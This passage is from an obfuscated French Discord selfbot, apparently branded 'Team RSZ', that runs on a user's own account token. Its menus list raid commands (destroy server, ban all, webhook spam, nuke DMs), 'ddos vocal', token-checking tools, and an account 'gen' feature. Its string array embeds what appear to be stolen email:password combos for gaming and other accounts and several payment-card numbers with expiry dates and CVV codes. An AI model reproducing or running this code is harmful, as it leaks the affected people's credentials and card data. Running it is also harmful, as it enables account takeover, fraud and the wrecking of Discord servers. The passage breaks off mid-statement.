20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a╟─────────────────────────────────╢\x0a║-->\x20\x20Membres:\x20','avatar','`Met\x20un\x20statut\x20Skype`','tiktok','\x0a║-->\x20Content:\x20','create\x20channel**','mp\x20friend','╟\x20Commande\x20nsfw\x20fif\x20executé','\x20sur\x20fortnite**','>>>\x20Restock\x20\x20en\x20cours\x20\x0a\x20**Chargement.**\x20\x0a\x20▓░░░░░░░░░░░░░░░░░░░░░░░░\x204%','gjmg106@yahoo.com:Mgross1125','\x20sur\x20Nike**','https://discord.gift/6VxXNZ8ut3ceeehdtTuQZJBE','split','`rocket\x20league`,\x20`spotify`,\x20`fortnite`,\x20`among\x20us`,\x20`badlion`,\x20`apex`,\x20`csgo`,\x20`roblox`,\x20`pornhub`,\x20`tinder`,\x20`clash\x20royal`,\x20`clash\x20of\x20clan`,\x20`naruto`,\x20`hunter\x20x\x20hunter`,\x20`tokyo\x20ghoul`,\x20`youtube`,\x20`minecraft`,\x20`twitter`,\x20`instagram`,\x20`tiktok`,\x20`facebook`,\x20`snapchat`,\x20`skype`,\x20`google`,\x20`nike`,\x20`lacoste`,\x20`gucci`','sovitta:62o2o20g\x20|\x20SHIELD\x20=\x20False\x20|\x20Nombre\x20de\x20Goultines\x20=\x200\x20|\x20Nombre\x20d\x27Ogrines\x20=\x200\x20|\x20Nombre\x20de\x20Kroz\x20=\x200\x20|\x20Personnage\x20=\x20[Xelor\x20-\x20Niv.\x2068\x20-\x20Meriana,\x20Cra\x20-\x20Niv.\x2093\x20-\x20Meriana,\x20Pandawa\x20-\x20Niv.\x2073\x20-\x20Meriana,\x20Eniripsa\x20-\x20Niv.\x20167\x20-\x20Meriana]\x20|\x20Nombre\x20de\x20Kamas\x20=\x20[Meriana\x20=\x2013\x20751]\x20|\x20Kamas\x20en\x20attente\x20=\x20[0]\x20|\x20Abonné\x20=\x20False','https://media1.tenor.com/images/9730876547cb3939388cf79b8a641da9/tenor.gif?itemid=8073516','Token\x20match\x20','Juillet','╟\x20Commande\x20ban\x20all\x20executé','member','https://discord.gg/tj5SKx6HFx\x20\x0a','\x20sur\x20Apex\x20Legends**','>>>\x20Restock\x20\x20en\x20cours\x20\x0a\x20**Chargement..**\x20\x0a\x20▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░\x2080%','webhook\x20spam**','serveur\x20info','\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a╟─────────────────────────────────╢\x0a║-->\x20\x20Salons\x20:\x20','steal\x20banniere','clear','https://cdn.discordapp.com/emojis/','jose280p:junio123\x20|\x20SHIELD\x20=\x20False\x20|\x20Nombre\x20de\x20Goultines\x20=\x200\x20|\x20Nombre\x20d\x27Ogrines\x20=\x200\x20|\x20Nombre\x20de\x20Kroz\x20=\x200\x20|\x20Personnage\x20=\x20[Eliotrope\x20-\x20Niv.\x2022\x20-\x20Atcham]\x20|\x20Nombre\x20de\x20Kamas\x20=\x20[Atcham\x20=\x202\x20909]\x20|\x20Kamas\x20en\x20attente\x20=\x20[0]\x20|\x20Abonné\x20=\x20False','**Commandes\x20Hack**\x20:skull_and_crossbones:\x20:','public_flags','40%','`Pat\x20une\x20personne`','**Commande\x20ddos\x20vocal\x20activé**','https://media.tenor.com/images/2eef4d8e3eae8b321fdb2aff1feefbec/tenor.gif',':white_check_mark:\x20**Auto\x20Voice\x20kick\x20set\x20up\x20l\x27utilisateur\x20ne\x20peut\x20desormé\x20rejoindre\x20les\x20channels\x20vocaux\x20de\x20ce\x20serveur**','tlml.sev@orange.fr:\x20co99al03','nitro**','U.S.\x20South','drzanis@gmail.com:sh33pdog\x20Units\x20=\x20110\x20Level\x20=\x2018\x20\x20Tier\x20=\x20Bronze\x20Club\x20Member\x20=\x20False\x20Games\x20=\x20[anno-2070,\x20assassins-creed-brotherhood,\x20far-cry-3,\x20far-cry-3-blood-dragon,\x20far-cry-4,\x20,\x20ghost-recon-future-soldier,\x20prince-of-persia-forgotten-sands,\x20silent-hunter-5,\x20splinter-cell-conviction]\x20Platforms\x20=\x20[PC,\x20PC,\x20PC,\x20PC,\x20PC,\x20ANDROID,\x20PC,\x20PC,\x20PC','Aout','https://media1.tenor.com/images/5b2bbfcbc1724a0bdc1b48dcf89274d6/tenor.gif?itemid=16648179','║-->\x20New\x20ghostping\x20\x0a║-->\x20serveur:\x20','hasPermission','https://media1.tenor.com/images/274fc34d3add3ce4cbb5716cb4f94f4f/tenor.gif?itemid=5841198','josephriddle4@gmail.com:uncbball\x20|\x20Expiration\x20=\x202022-02-04\x2014:51:54','nuke\x20dm','╟\x20Commande\x20webhook\x20spam\x20éxécuté','rolecreate','spotify:ab67616d0000b2739501a78fed26d59bb86d1d9e','green','token\x20(@user)**','**Pannel\x20de\x20Help\x20Statut**\x20:performing_arts:\x20','norbertassss@gmail.com:zaibas123','error','apex','>>>\x20Restock\x20\x20en\x20cours\x20\x0a\x20**Chargement.**\x20\x0a\x20▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░░\x2064%','shadowkid323@yahoo.com:323Swaoso','iconURL','`Creer\x2010\x20channels\x20textuel`','join','bold','danielorders101@gmail.com:Freedom18\x20|\x20Expiration\x20=\x202019-09-12\x2021:06:31','PLAYING','@everyone\x0ahttps://discord.gg/5S54Svq6hR\x0a\x20Discord\x0ahttps://discord.gg/5S54Svq6hR','45%','(╯°□°）╯︵\x20\x20┻━┻',']:\x20𝐋𝐨𝐚𝐝𝐢𝐧𝐠\x20𝐃𝐢𝐬𝐜𝐨𝐫𝐝\x20𝐕𝐢𝐫𝐮𝐬\x20[▓▓▓▓▓▓▓▓▓▓▓]\x20𝟕𝟓%','arisel00@gmail.com:bartek12','**Commandes\x20Utile**\x20:globe_with_meridians:\x20:','help\x20fun','csgo','>>>\x20Restock\x20\x20en\x20cours\x20\x0a\x20**Chargement...**\x20\x0a\x20▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░\x2072%','Created\x20On:','https://media.tenor.com/images/ad3b6e61921d1fb44b2121156e8560ce/tenor.gif','5491842653582528|09|2023|270',':information_source:\x20\x20Votre\x20statut\x20a\x20été\x20réinitialisé\x20!\x20:information_source:','Servers:','EMBED_LINKS','deleteDM','sanguinans.sabulum@gmail.com:cityhugger\x20\x20Units\x20=\x20140\x20Level\x20=\x2020\x20\x20Tier\x20=\x20Silver\x20Club\x20Member\x20=\x20False\x20Games\x20=\x20[anno-2070,\x20far-cry-3-blood-dragon,\x20,\x20far-cry-new-dawn,\x20ghost-recon-wildlands,\x20might-magic-heroes-vi,\x20tom-clancy-the-division-2,\x20zombi\x20\x20','roblox','Roles:','Jooscia:Cerise59\x20|\x20SHIELD\x20=\x20False\x20|\x20Nombre\x20de\x20Goultines\x20=\x200\x20|\x20Nombre\x20d\x27Ogrines\x20=\x200\x20|\x20Nombre\x20de\x20Kroz\x20=\x200\x20|\x20Personnage\x20=\x20[]\x20|\x20Nombre\x20de\x20Kamas\x20=\x20[Meriana\x20=\x20246]\x20|\x20Kamas\x20en\x20attente\x20=\x20[0]\x20|\x20Abonné\x20=\x20False','includes','shayona_dhanak@yahoo.com:dhanak18','`Affiche\x20les\x20informations\x20d\x27un\x20utilisateur\x20grace\x20a\x20un\x20token`','locale','backup\x20friend','je\x20ne\x20pense\x20pas.','╟\x20Commande\x20help\x20utile','5491847833067753|10|2022|229','\x20kiss\x20','help\x20nsfw','username','rocket_league','verified','\x0amentionnable:\x20','trishap77@yahoo.com:Layla8611\x20\x20Units\x20=\x20180\x20Level\x20=\x2020\x20\x20Tier\x20=\x20Silver\x20Club\x20Member\x20=\x20False\x20Games\x20=\x20[assassins-creed-III,\x20assassins-creed-4-black-flag,\x20assassins-creed-4-black-flag,\x20assassins-creed-odyssey,\x20assassins-creed-unity,\x20,\x20for-honor]\x20\x20Platforms\x20=\x20[XBox360,\x20XONE,\x20XBox360,\x20PS4,\x20XONE,\x20ANDROID,\x20XONE','https://media.tenor.com/images/ed007451355180adaf4b697405030490/tenor.gif','5491846174452178|09|2024|253','╟\x20Commande\x20load\x20executé','itznevers:16092001\x20|\x20SHIELD\x20=\x20False\x20|\x20Nombre\x20de\x20Goultines\x20=\x200\x20|\x20Nombre\x20d\x27Ogrines\x20=\x200\x20|\x20Nombre\x20de\x20Kroz\x20=\x200\x20|\x20Personnage\x20=\x20[Iop\x20-\x20Niv.\x2044\x20-\x20Julith,\x20Ecaflip\x20-\x20Niv.\x2046\x20-\x20Julith,\x20Feca\x20-\x20Niv.\x2046\x20-\x20Julith,\x20Osamodas\x20-\x20Niv.\x2047\x20-\x20Julith,\x20Roublard\x20-\x20Niv.\x2054\x20-\x20Julith]\x20|\x20Nombre\x20de\x20Kamas\x20=\x20[Julith\x20=\x2017\x20144]\x20|\x20Kamas\x20en\x20attente\x20=\x20[0]\x20|\x20Abonné\x20=\x20False','billboquet29:Abcdefg39\x20|\x20SHIELD\x20=\x20False\x20|\x20Nombre\x20de\x20Goultines\x20=\x200\x20|\x20Nombre\x20d\x27Ogrines\x20=\x20400\x20|\x20Nombre\x20de\x20Kroz\x20=\x200\x20|\x20Personnage\x20=\x20[]\x20|\x20Nombre\x20de\x20Kamas\x20=\x20[Meriana\x20=\x20,\x20Merkator\x20=\x202]\x20|\x20Kamas\x20en\x20attente\x20=\x20[0,\x200]\x20|\x20Abonné\x20=\x20False','blush**','juandy.gp@gmail.com:N0entres','`Bat\x20toi\x20avec\x20un\x20utilisateur`','presence','krisnordall@gmail.com:Kris1997','Naruto','change\x20hypesquad\x20(brilliance/bravery/ballance)**','MOVE_MEMBERS','XXn_KA'];const _0x4ab3e5=_0x5e0d;(function(_0x161b0a,_0x1a3e44){const _0x4ce3e5=_0x5e0d;while(!![]){try{const _0x5e6d64=-parseInt(_0x4ce3e5(0x48b))+-parseInt(_0x4ce3e5(0x311))+parseInt(_0x4ce3e5(0x2f1))+parseInt(_0x4ce3e5(0x315))+-parseInt(_0x4ce3e5(0x6b9))*-parseInt(_0x4ce3e5(0x1e5))+-parseInt(_0x4ce3e5(0x1de))*-parseInt(_0x4ce3e5(0x6d0))+-parseInt(_0x4ce3e5(0x3be));if(_0x5e6d64===_0x1a3e44)break;else _0x161b0a['push'](_0x161b0a['shift']());}catch(_0x1fd4ec){_0x161b0a['push'](_0x161b0a['shift']());}}}(_0x3301,0xbb9ab));const Discord=require(_0x4ab3e5(0x43b));require('colors');const client=new Discord['Client'](),ConfigFile=require(_0x4ab3e5(0x5fa)),premiumfile=require('./team.json'),token=ConfigFile[_0x4ab3e5(0x27f)],yourgif=ConfigFile[_0x4ab3e5(0x3e2)],stream=ConfigFile[_0x4ab3e5(0x4cf)],questionteam=premiumfile[_0x4ab3e5(0x6a6)],base64=require('base-64'),utf8=require(_0x4ab3e5(0x4fa)),fs=require('fs'),hastebins=require(_0x4ab3e5(0x6b6)),rpcGenerator=require(_0x4ab3e5(0x287)),backups=require(_0x4ab3e5(0x612)),afk=require(_0x4ab3e5(0x6df)),db=require('./Data/pubmp.json'),lbackup=require(_0x4ab3e5(0x3f7)),kicked=require(_0x4ab3e5(0x69b)),prefix=ConfigFile[_0x4ab3e5(0x2d2)],superagent=require(_0x4ab3e5(0x5e2)),fetch=require(_0x4ab3e5(0x293)),request=require(_0x4ab3e5(0x22b)),{cpuUsage}=require('process');function nitrocode(_0x3cba0b,_0x19ec37){const _0x80edc6=_0x4ab3e5;var _0x4abcec='';if(_0x19ec37['indexOf']('0')>-0x1)_0x4abcec+='0123456789';if(_0x19ec37[_0x80edc6(0x2ab)]('A')>-0x1)_0x4abcec+=_0x80edc6(0x5dd);if(_0x19ec37[_0x80edc6(0x2ab)]('a')>-0x1)_0x4abcec+=_0x80edc6(0x60a);var _0x32fc6b='';for(var _0x234850=_0x3cba0b;_0x234850>0x0;--_0x234850){_0x32fc6b+=_0x4abcec[Math[_0x80edc6(0x49c)](Math[_0x80edc6(0x4ca)]()*_0x4abcec['length'])];}return _0x32fc6b;}const color=ConfigFile['color'],rire=[_0x4ab3e5(0x651),_0x4ab3e5(0x4b0),_0x4ab3e5(0x58c),_0x4ab3e5(0x516),_0x4ab3e5(0x63f),_0x4ab3e5(0x601),'https://media1.tenor.com/images/bfde037642a618465ba50f4c463b49c3/tenor.gif?itemid=16137557'],kiss=['https://media.tenor.com/images/faadbe17f1b4fbf399be38eaddff6e05/tenor.gif','https://media1.tenor.com/images/78095c007974aceb72b91aeb7ee54a71/tenor.gif?itemid=5095865','https://media1.tenor.com/images/bc5e143ab33084961904240f431ca0b1/tenor.gif?itemid=9838409','https://media1.tenor.com/images/4b5d5afd747fe053ed79317628aac106/tenor.gif?itemid=5649376'],hugh=[_0x4ab3e5(0x2eb),_0x4ab3e5(0x680),_0x4ab3e5(0x5b0),'https://media.tenor.com/images/0abe1090ab9874c62c4baaac18f0994d/tenor.gif'],veski=[_0x4ab3e5(0x555),_0x4ab3e5(0x498),_0x4ab3e5(0x1d8)],punch=['https://media.tenor.com/images/5cdcbff8c5bce802d7b65baa711f12f4/tenor.gif',_0x4ab3e5(0x275),_0x4ab3e5(0x54b),'https://media.tenor.com/images/04a3cf11736bfa9083b91f2d41b76774/tenor.gif'],pat=[_0x4ab3e5(0x514),_0x4ab3e5(0x6ca),'https://media1.tenor.com/images/55df4c5fb33f3cd05b2f1ac417e050d9/tenor.gif?itemid=6238142','https://media1.tenor.com/images/6ee188a109975a825f53e0dfa56d497d/tenor.gif?itemid=17747839',_0x4ab3e5(0x5fd)],cry=[_0x4ab3e5(0x3c2),_0x4ab3e5(0x5bf),_0x4ab3e5(0x344),_0x4ab3e5(0x253),_0x4ab3e5(0x552)],highfive=['https://media.tenor.com/images/d0bfc98b52b881153657932c6dce511c/tenor.gif',_0x4ab3e5(0x613),_0x4ab3e5(0x537),_0x4ab3e5(0x573)];var verifLevels=[_0x4ab3e5(0x337),_0x4ab3e5(0x224),_0x4ab3e5(0x382),_0x4ab3e5(0x56b)],region={'Brésil':_0x4ab3e5(0x699),'eu-central':'Central\x20Europe','singapoure':_0x4ab3e5(0x424),'us-central':'U.S.\x20Central','sydney':_0x4ab3e5(0x5f5),'us-east':_0x4ab3e5(0x3c3),'us-south':_0x4ab3e5(0x54f),'us-west':_0x4ab3e5(0x29e),'eu-west':'Western\x20Europe','vip-us-east':'VIP\x20U.S.\x20East','Londre':_0x4ab3e5(0x628),'amsterdam':_0x4ab3e5(0x423),'hongkong':'Hong\x20Kong'};function translateDate(_0x356081){const _0x2ce5c9=_0x4ab3e5,_0xdb3838=[_0x2ce5c9(0x2bf),_0x2ce5c9(0x2ff),_0x2ce5c9(0x1d4),_0x2ce5c9(0x2bd),'Mai',_0x2ce5c9(0x366),_0x2ce5c9(0x539),_0x2ce5c9(0x551),_0x2ce5c9(0x653),_0x2ce5c9(0x62c),_0x2ce5c9(0x317),'Dec'],_0x2b468d=[_0x2ce5c9(0x21f),'Lundi',_0x2ce5c9(0x419),_0x2ce5c9(0x5b6),'Jeudi',_0x2ce5c9(0x69d),'Samedi'];return _0x2b468d[_0x356081[_0x2ce5c9(0x6c0)]()]+',\x20'+_0x356081[_0x2ce5c9(0x354)]()+'\x20'+_0xdb3838[_0x356081[_0x2ce5c9(0x397)]()]+'\x20'+_0x356081[_0x2ce5c9(0x402)]()+'\x20at\x20'+_0x356081['getUTCHours']()+':'+zeros(_0x356081['getUTCMinutes'](),0x2)+':'+zeros(_0x356081[_0x2ce5c9(0x66f)](),0x2)+'.'+zeros(_0x356081[_0x2ce5c9(0x665)](),0x3);}function checkDays(_0x3a90cd){const _0x21c495=_0x4ab3e5;var _0x3819b0=new Date(),_0x3772fd=_0x3819b0[_0x21c495(0x39d)]()-_0x3a90cd[_0x21c495(0x39d)](),_0x4c4e99=Math[_0x21c495(0x49c)](_0x3772fd/0x5265c00);return _0x4c4e99+(_0x4c4e99==0x1?'\x20day':'\x20days')+'\x20ago';};client['on']('ready',function(){const _0x23db2a=_0x4ab3e5;if(questionteam==_0x23db2a(0x5c0))var _0x53c3f2=_0x23db2a(0x50a);else var _0x53c3f2=_0x23db2a(0x2d4);console[_0x23db2a(0x543)],console[_0x23db2a(0x32b)]((_0x23db2a(0x623)+client[_0x23db2a(0x377)]['tag']+'\x20\x20\x20\x0a╟─────────────────────────────────╢\x0a║-->\x20\x20id\x20\x20\x20\x20\x20:\x20'+client[_0x23db2a(0x377)]['id']+'\x20\x0a╟─────────────────────────────────╢\x0a║-->\x20\x20Prefix\x20:\x20'+prefix+_0x23db2a(0x527)+client[_0x23db2a(0x5be)][_0x23db2a(0x216)](_0x560752=>_0x560752['memberCount'])['reduce']((_0x48a1bd,_0x541113)=>_0x48a1bd+_0x541113)+_0x23db2a(0x247)+client[_0x23db2a(0x608)][_0x23db2a(0x508)](_0x4542d3=>_0x4542d3['bot'])[_0x23db2a(0x3ed)]+_0x23db2a(0x541)+client[_0x23db2a(0x2e6)][_0x23db2a(0x3ed)]+'\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a╟─────────────────────────────────╢\x0a║-->\x20\x20Serveurs:\x20'+client[_0x23db2a(0x5be)][_0x23db2a(0x3ed)]+_0x23db2a(0x3ac)+_0x53c3f2+_0x23db2a(0x3dc)+stream+_0x23db2a(0x69a))[_0x23db2a(0x55b)]);if(client[_0x23db2a(0x377)][_0x23db2a(0x459)]>0x0)console[_0x23db2a(0x32b)](_0x23db2a(0x3f4)[_0x23db2a(0x507)][_0x23db2a(0x60f)]);else console[_0x23db2a(0x32b)]('Vous\x20n\x27avez\x20pas\x20de\x20nitro,\x20ne\x20t\x27inquiète\x20pas\x20mon\x20autoclaim\x20va\x20tout\x20faire\x20pour\x20que\x20tu\x20en\x20recuperes\x201'[_0x23db2a(0x5fb)]);}),client['on'](_0x4ab3e5(0x1dd),function(){const _0x2ddb45=_0x4ab3e5;if(client[_0x2ddb45(0x377)][_0x2ddb45(0x512)])console['log']((client[_0x2ddb45(0x377)]['username']+_0x2ddb45(0x333))[_0x2ddb45(0x5fb)]),process[_0x2ddb45(0x5a1)](0x1);else console[_0x2ddb45(0x32b)]((client[_0x2ddb45(0x377)][_0x2ddb45(0x587)]+'\x20tu\x20n\x27es\x20pas\x20un\x20robot\x20^^!')['italic']['magenta']);console['log'](_0x2ddb45(0x6a5));});var uuid=()=>([0x989680]+-0x3e8+-0xfa0+-0x1f40+-0x174876e800)['replace'](/[018]/g,_0x3b8299=>(_0x3b8299^Math[_0x4ab3e5(0x4ca)]()*0x10>>_0x3b8299/0x4)[_0x4ab3e5(0x6db)](0x10));client['on']('ready',function(){const _0x3db3fc=_0x4ab3e5;rpcGenerator[_0x3db3fc(0x5d9)](_0x3db3fc(0x3b7),_0x3db3fc(0x291))[_0x3db3fc(0x1d9)](_0x3b650b=>{const _0x5b96b6=_0x3db3fc;rpcGenerator['getRpcImage'](_0x5b96b6(0x3b7),_0x5b96b6(0x45f))['then'](_0xa7c21a=>{const _0x28158c=_0x5b96b6;let _0x41760f=new rpcGenerator[(_0x28158c(0x6a4))]()['setName'](_0x28158c(0x4f3))[_0x28158c(0x432)](_0x28158c(0x430))[_0x28158c(0x2f4)](_0x28158c(0x30f))['setApplicationId'](_0x28158c(0x3b7))[_0x28158c(0x685)](stream)[_0x28158c(0x231)](_0xa7c21a['id'])[_0x28158c(0x413)](_0x3b650b['id'])['setAssetsLargeText']('\x20')[_0x28158c(0x204)]('\x20')[_0x28158c(0x458)](Date['now']())[_0x28158c(0x2d8)]({'id':uuid()});client[_0x28158c(0x377)][_0x28158c(0x695)](_0x41760f[_0x28158c(0x694)]())['catch'](console[_0x28158c(0x55f)]);});});});let gen=new Discord[(_0x4ab3e5(0x2e8))]();gen[_0x4ab3e5(0x279)]()[_0x4ab3e5(0x39b)](color)[_0x4ab3e5(0x4ea)](_0x4ab3e5(0x233))[_0x4ab3e5(0x47c)]('https://discord.gg/5S54Svq6hR')[_0x4ab3e5(0x6e4)]('`'+(_0x4ab3e5(0x617)+prefix)+'`')[_0x4ab3e5(0x463)]('\x20```Nitro```\x20','***gen\x20un\x20nitro\x20random***')['addField'](_0x4ab3e5(0x3d7),_0x4ab3e5(0x1ea))['addField']('\x20```Gspotify```\x20',_0x4ab3e5(0x624))[_0x4ab3e5(0x463)](_0x4ab3e5(0x3d6),_0x4ab3e5(0x5cd))[_0x4ab3e5(0x463)]('\x20```Uplay```\x20',_0x4ab3e5(0x61c))[_0x4ab3e5(0x463)](_0x4ab3e5(0x43e),'***gen\x20un\x20pornhub***')[_0x4ab3e5(0x463)](_0x4ab3e5(0x5b1),_0x4ab3e5(0x250))['addField']('\x20```Dofus```\x20',_0x4ab3e5(0x1d6))['addField'](_0x4ab3e5(0x41e),_0x4ab3e5(0x379))['addField'](_0x4ab3e5(0x48c),_0x4ab3e5(0x378))[_0x4ab3e5(0x6ae)](yourgif)[_0x4ab3e5(0x36f)](_0x4ab3e5(0x4e7))[_0x4ab3e5(0x248)](_0x4ab3e5(0x4f3));let cmd=new Discord['RichEmbed']();cmd[_0x4ab3e5(0x279)]()['setColor'](color)[_0x4ab3e5(0x4ea)](_0x4ab3e5(0x3bd))[_0x4ab3e5(0x47c)]('https://discord.gg/5S54Svq6hR')[_0x4ab3e5(0x463)]('**Commande\x20Help**',_0x4ab3e5(0x40b))[_0x4ab3e5(0x463)](_0x4ab3e5(0x636),_0x4ab3e5(0x2e9))['addField'](_0x4ab3e5(0x41c),'`voice\x20kick`,\x20`set\x20serveur\x20name`,\x20`roles\x20list`,\x20`channels\x20list`,\x20`shutdown`,\x20`kick`,\x20`ban`,\x20`purge`,\x20`discord`,\x20`gen\x20token`,\x20`user\x20info`,\x20`role\x20info`,\x20`serveur\x20info`,\x20`stats`,\x20`encode`,\x20`mp\x20friend`')[_0x4ab3e5(0x463)]('**Commandes\x20Nsfw**\x20:underage:\x20:',_0x4ab3e5(0x3ef))[_0x4ab3e5(0x463)]('**Commandes\x20Raid**\x20:no_entry_sign:\x20:',_0x4ab3e5(0x4ba))[_0x4ab3e5(0x463)](_0x4ab3e5(0x546),_0x4ab3e5(0x2a9))[_0x4ab3e5(0x463)](_0x4ab3e5(0x56e),_0x4ab3e5(0x219))[_0x4ab3e5(0x463)](_0x4ab3e5(0x675),_0x4ab3e5(0x535))['setDescription']('`'+(_0x4ab3e5(0x617)+prefix)+'`')['setImage'](yourgif)[_0x4ab3e5(0x36f)](_0x4ab3e5(0x4e7))[_0x4ab3e5(0x248)](_0x4ab3e5(0x4f3));let help_hack=new Discord[(_0x4ab3e5(0x2e8))]()[_0x4ab3e5(0x279)]()[_0x4ab3e5(0x39b)](color)['setTitle']('**Pannel\x20de\x20Help\x20Hacking**')[_0x4ab3e5(0x47c)](_0x4ab3e5(0x349))[_0x4ab3e5(0x463)]('**'+prefix+'ddos\x20voc**',_0x4ab3e5(0x334))[_0x4ab3e5(0x463)]('**'+prefix+'ddos-stop**',_0x4ab3e5(0x4b4))[_0x4ab3e5(0x463)]('**'+prefix+_0x4ab3e5(0x67a),_0x4ab3e5(0x482))[_0x4ab3e5(0x463)]('**'+prefix+_0x4ab3e5(0x55c),_0x4ab3e5(0x690))[_0x4ab3e5(0x463)]('**'+prefix+_0x4ab3e5(0x4ff),'`Check\x20si\x20un\x20token\x20est\x20valide`')[_0x4ab3e5(0x463)]('**'+prefix+_0x4ab3e5(0x64c),_0x4ab3e5(0x57f))[_0x4ab3e5(0x463)]('**'+prefix+_0x4ab3e5(0x6c2),_0x4ab3e5(0x670))[_0x4ab3e5(0x6e4)]('`'+(_0x4ab3e5(0x617)+prefix)+'`')['setDescription']('[Lien\x20pour\x20avoir\x20𝚃𝚎𝚊𝚖\x20𝚁𝚂𝚉](Soon)')['setImage'](yourgif)[_0x4ab3e5(0x36f)](_0x4ab3e5(0x4e7))['setFooter'](_0x4ab3e5(0x4f3)),help_raid=new Discord[(_0x4ab3e5(0x2e8))]()['setTimestamp']()[_0x4ab3e5(0x39b)](color)[_0x4ab3e5(0x4ea)](_0x4ab3e5(0x4ef))['setURL'](_0x4ab3e5(0x6d1))['addField']('**'+prefix+'serveur\x20info**',_0x4ab3e5(0x318))[_0x4ab3e5(0x463)]('**'+prefix+_0x4ab3e5(0x418),_0x4ab3e5(0x372))[_0x4ab3e5(0x463)]('**'+prefix+_0x4ab3e5(0x52c),_0x4ab3e5(0x564))['addField']('**'+prefix+_0x4ab3e5(0x3c4),_0x4ab3e5(0x34d))[_0x4ab3e5(0x463)]('**'+prefix+_0x4ab3e5(0x53f),_0x4ab3e5(0x32f))['addField']('**'+prefix+'destroy**,\x22Détruit\x20le\x20serveur\x22')[_0x4ab3e5(0x463)]('**'+prefix+_0x4ab3e5(0x4cb),_0x4ab3e5(0x2dc))[_0x4ab3e5(0x463)]('**'+prefix+'stop\x20spam**',_0x4ab3e5(0x4c4))[_0x4ab3e5(0x463)]('**'+prefix+_0x4ab3e5(0x274),_0x4ab3e5(0x416))[_0x4ab3e5(0x463)]('**'+prefix+_0x4ab3e5(0x5bd),_0x4ab3e5(0x226))[_0x4ab3e5(0x463)]('**'+prefix+_0x4ab3e5(0x4d9),_0x4ab3e5(0x6e0))[_0x4ab3e5(0x463)]('**'+prefix+_0x4ab3e5(0x320),_0x4ab3e5(0x460))['addField']('**'+prefix+_0x4ab3e5(0x2fb),_0x4ab3e5(0x31a))[_0x4ab3e5(0x463)]('**'+prefix+_0x4ab3e5(0x1f9),_0x4ab3e5(0x3a2))[_0x4ab3e5(0x6e4)]('`'+(_0x4ab3e5(0x617)+prefix)+'`')[_0x4ab3e5(0x6e4)](_0x4ab3e5(0x63b))[_0x4ab3e5(0x6ae)](yourgif)[_0x4ab3e5(0x36f)](_0x4ab3e5(0x4e7))[_0x4ab3e5(0x248)](_0x4ab3e5(0x4f3)),help=new Discord[(_0x4ab3e5(0x2e8))]();help[_0x4ab3e5(0x279)]()[_0x4ab3e5(0x39b)](color)[_0x4ab3e5(0x4ea)](_0x4ab3e5(0x5c6))['setURL']('https://discord.gg/vxGygmGyEq')[_0x4ab3e5(0x463)]('**'+prefix+'cmd**',_0x4ab3e5(0x46b))['addField']('**'+prefix+'help\x20fun**',_0x4ab3e5(0x342))[_0x4ab3e5(0x463)]('**'+prefix+'help\x20backup**',_0x4ab3e5(0x445))[_0x4ab3e5(0x463)]('**'+prefix+_0x4ab3e5(0x5a8),_0x4ab3e5(0x506))[_0x4ab3e5(0x463)]('**'+prefix+'help\x20utile**',_0x4ab3e5(0x43f))[_0x4ab3e5(0x463)]('**'+prefix+_0x4ab3e5(0x660),_0x4ab3e5(0x2b5))['addField']('**'+prefix+_0x4ab3e5(0x3b8),_0x4ab3e5(0x625))[_0x4ab3e5(0x463)]('**'+prefix+_0x4ab3e5(0x641),_0x4ab3e5(0x2ea))[_0x4ab3e5(0x463)]('**'+prefix+_0x4ab3e5(0x220),_0x4ab3e5(0x295))[_0x4ab3e5(0x6e4)]('`'+(_0x4ab3e5(0x617)+prefix)+'`')[_0x4ab3e5(0x6e4)](_0x4ab3e5(0x63b))[_0x4ab3e5(0x6ae)](yourgif)['setThumbnail'](_0x4ab3e5(0x4e7))['setFooter'](_0x4ab3e5(0x4f3));let help_statut=new Discord[(_0x4ab3e5(0x2e8))]()[_0x4ab3e5(0x39b)](color)[_0x4ab3e5(0x4ea)]('**Pannel\x20de\x20Help\x20Statut**\x20:performing_arts:\x20')[_0x4ab3e5(0x6e4)](_0x4ab3e5(0x5b8))['addField']('**'+prefix+_0x4ab3e5(0x3ae),'`Met\x20un\x20statut\x20Rocket\x20League`')[_0x4ab3e5(0x463)]('**'+prefix+_0x4ab3e5(0x66c),_0x4ab3e5(0x4ec))[_0x4ab3e5(0x463)]('**'+prefix+'fortnite\x20(text)**',_0x4ab3e5(0x1ef))['addField']('**'+prefix+'among\x20us\x20(text)**',_0x4ab3e5(0x282))[_0x4ab3e5(0x463)]('**'+prefix+'gucci\x20(text)**',_0x4ab3e5(0x32d))[_0x4ab3e5(0x463)]('**'+prefix+'lacoste\x20(text)**',_0x4ab3e5(0x449))[_0x4ab3e5(0x463)]('**'+prefix+_0x4ab3e5(0x6c1),_0x4ab3e5(0x31e))[_0x4ab3e5(0x463)]('**'+prefix+_0x4ab3e5(0x61b),_0x4ab3e5(0x6d5))[_0x4ab3e5(0x463)]('**'+prefix+_0x4ab3e5(0x2ec),_0x4ab3e5(0x529))[_0x4ab3e5(0x463)]('**'+prefix+_0x4ab3e5(0x325),_0x4ab3e5(0x4b1))[_0x4ab3e5(0x463)]('**'+prefix+_0x4ab3e5(0x2d3),_0x4ab3e5(0x4f6))[_0x4ab3e5(0x463)]('**'+prefix+'tiktok\x20(text)**',_0x4ab3e5(0x67f))[_0x4ab3e5(0x463)]('**'+prefix+_0x4ab3e5(0x493),'`Met\x20un\x20statut\x20Twitter`')[_0x4ab3e5(0x463)]('**'+prefix+_0x4ab3e5(0x504),_0x4ab3e5(0x347))['addField']('**'+prefix+_0x4ab3e5(0x4ac),_0x4ab3e5(0x48e))[_0x4ab3e5(0x6e4)]('`'+(_0x4ab3e5(0x617)+prefix)+'`')[_0x4ab3e5(0x6ae)](yourgif)[_0x4ab3e5(0x36f)](_0x4ab3e5(0x4e7))[_0x4ab3e5(0x248)]('𝚃𝚎𝚊𝚖\x20𝚁𝚂𝚉'),help_statut2=new 